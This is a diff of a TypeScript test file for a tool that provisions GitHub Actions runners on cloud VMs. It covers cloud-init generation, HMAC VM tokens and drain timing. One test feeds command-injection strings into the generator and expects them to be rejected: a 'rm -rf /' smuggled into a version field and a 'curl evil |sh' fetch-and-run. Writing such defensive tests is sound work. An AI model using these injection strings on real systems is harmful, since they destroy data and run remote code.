@@ -3,7 +3,14 @@ import { createHmac } from 'node:crypto';
 import { test } from 'node:test';
 import { buildUserData } from '../src/cloud-init.ts';
 import { parseRepos } from '../src/config.ts';
-import { labelsMatch, serverNameForJob, verifySignature } from '../src/github.ts';
+import {
+  labelsMatch,
+  serverNameForJob,
+  verifySignature,
+  vmToken,
+  verifyVmToken,
+  shouldDrain,
+} from '../src/github.ts';
 import { isExpired } from '../src/hetzner.ts';
 
 const SECRET = 'test-secret';
@@ -58,16 +65,56 @@ test('isExpired compares server age against the lifetime', () => {
   assert.equal(isExpired('2026-01-01T11:00:00Z', 120, now), false);
 });
 
-test('buildUserData embeds version and JIT config, stays under the size limit', () => {
-  const jit = Buffer.from('x'.repeat(3000)).toString('base64');
-  const userData = buildUserData('2.335.1', jit);
+test('buildUserData embeds version, JIT config, VM name, token, and public URL, stays under the size limit', () => {
+  const jit = Buffer.from('x'.repeat(1500)).toString('base64');
+  const token = 'a'.repeat(64);
+  const userData = buildUserData('2.335.1', jit, 'ci-runner-12345', token, 'https://example.com');
   assert.ok(userData.startsWith('#cloud-config'));
   assert.ok(userData.includes('actions-runner-linux-x64-2.335.1.tar.gz'));
-  assert.ok(userData.includes(`--jitconfig ${jit}`));
+  assert.ok(userData.includes("./run.sh --jitconfig"));
+  assert.ok(userData.includes('agent-loop.sh'));
+  assert.ok(userData.includes('ci-runner-12345'));
+  assert.ok(userData.includes(token));
+  assert.ok(userData.includes('https://example.com'));
   assert.ok(Buffer.byteLength(userData) < 32 * 1024);
 });
 
 test('buildUserData rejects unsafe interpolations', () => {
-  assert.throws(() => buildUserData('2.335.1; rm -rf /', 'YWJj'));
-  assert.throws(() => buildUserData('2.335.1', "abc'; curl evil |sh"));
+  const validToken = 'a'.repeat(64);
+  assert.throws(() => buildUserData('2.335.1; rm -rf /', 'YWJj', 'ci-runner-1', validToken, 'https://example.com'));
+  assert.throws(() => buildUserData('2.335.1', "abc'; curl evil |sh", 'ci-runner-1', validToken, 'https://example.com'));
+  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'bad/name', validToken, 'https://example.com'));
+  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'ci-runner-1', 'invalid-token', 'https://example.com'));
+  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'ci-runner-1', validToken, 'not-a-url'));
+});
+
+test('buildUserData does not contain the webhook secret', () => {
+  const token = 'a'.repeat(64);
+  const userData = buildUserData('2.335.1', 'YWJj', 'ci-runner-1', token, 'https://example.com');
+  assert.ok(!userData.includes('GITHUB_WEBHOOK_SECRET'));
+  assert.ok(!userData.includes('webhookSecret'));
+});
+
+test('vmToken computes HMAC-SHA256 and verifyVmToken validates it', () => {
+  const secret = 'my-webhook-secret';
+  const vmName = 'ci-runner-12345';
+  const token = vmToken(secret, vmName);
+  assert.equal(typeof token, 'string');
+  assert.equal(token.length, 64);
+  assert.match(token, /^[a-f0-9]+$/);
+  assert.ok(verifyVmToken(secret, vmName, token));
+  assert.ok(!verifyVmToken(secret, vmName, 'x'.repeat(64)));
+  assert.ok(!verifyVmToken('different-secret', vmName, token));
+});
+
+test('shouldDrain returns true in drain window (minute 50+) or no queued jobs', () => {
+  assert.equal(shouldDrain(10, true), false);
+  assert.equal(shouldDrain(49, true), false);
+  assert.equal(shouldDrain(50, true), true);
+  assert.equal(shouldDrain(59, true), true);
+  assert.equal(shouldDrain(70, true), false);
+  assert.equal(shouldDrain(110, true), true);
+  assert.equal(shouldDrain(10, false), true);
+  assert.equal(shouldDrain(49, false), true);
+  assert.equal(shouldDrain(50, false), true);
 });
